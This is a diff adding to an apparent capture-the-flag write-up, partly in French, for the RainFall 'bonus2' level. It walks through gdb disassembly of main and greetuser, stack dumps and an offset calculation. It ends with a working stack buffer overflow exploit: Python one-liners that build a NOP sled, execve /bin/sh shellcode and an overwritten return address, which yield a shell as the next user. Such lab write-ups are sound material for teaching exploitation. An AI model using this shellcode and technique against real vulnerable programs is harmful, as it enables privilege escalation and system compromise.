@@ -116,4 +116,93 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-On remarque 
+On remarque plusieurs éléments:
+- une variable globale = 0
+- un buffer d'au moins 72 (0x28 + 0x20)
+- `strncpy()` (+78)
+- `strncpy()` (+113)
+- `` LANG env
+- 2 `memcmp()` (+173 et +220) permettant de modifier la variable globale en fonction de la variable d'environnement
+
+
+```
+(gdb) disas greetuser
+Dump of assembler code for function main:
+```
+
+```
+   0x0804848a <+6>:        mov    eax,ds:0x8049988 // 'language'
+   0x0804848f <+11>:    cmp    eax,0x1
+   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
+   0x08048494 <+16>:    cmp    eax,0x2
+   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
+   0x08048499 <+21>:    test   eax,eax
+   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
+```
+
+```
+(gdb) x/s 0x8048710 // 
+0x8048710:     "Hello "
+(gdb) x/s 0x804872a
+0x804872a:     "Goedemiddag! "
+(gdb) x/s 0x8048717
+0x8048717:     "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
+(gdb) x/s 0x8048717
+0x8048717:     "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
+```
+
+
+
+On remarque aussi une fonction `greetuser()`:
+- un buffer de 72 (0x48)
+- (+11) cmp 1 => `strcpy()` buffer dans "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 "
+- (+11) cmp 2 => `strcpy()` buffer dans "Goedemiddag! "
+- (+11) cmp 0 => `strcpy()` buffer dans "Hello "
+
+
+
+
+
+
+
+
+
+we test to fill 0x28(40) + 0x20(32) = 72 to understand what happend in the memory we set breakpoint in <+152> greetuser we run the program with 'B' * 40 'A'*32
+
+(gdb) x/100wx $esp
+0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
+0xbffff5b0:	0x6c6c6548	0x4242206f	0x42424242	0x42424242
+0xbffff5c0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x41414242
+0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x08004141
+(gdb) x/x $ebp+0x4
+0xbffff5fc:	0x08004141  we change the return address
+so lets change the language and do the same test
+
+0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
+0xbffff5b0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
+0xbffff5c0:	0x424220a4	0x42424242	0x42424242	0x42424242
+0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff5e0:	0x42424242	0x42424242	0x41414242	0x41414141
+0xbffff5f0:	0x41414141	0x41414141 |0x41414141|	0x41414141
+
+the value selected is the return address
+so in this case we just need to calculate the offset and add shellcode in the begining and change the return address
+
+i used this website to calculate the offset
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+(gdb)
+bonus2@RainFall:~$ python -c "print 'B' * 18 + '\xc8\xf5\xff\xbf' + 'B' *30" > b
+bonus2@RainFall:~$ python -c "print '\x90' * 6 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 30" > a
+bonus2@RainFall:~$ ./bonus2 `cat a` `cat b`
+Hyvää päivää ������j
+                    X�Rh//shh/bin��1�̀AAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����BBBBBBBBBB
+$ whoami
+bonus3
+$
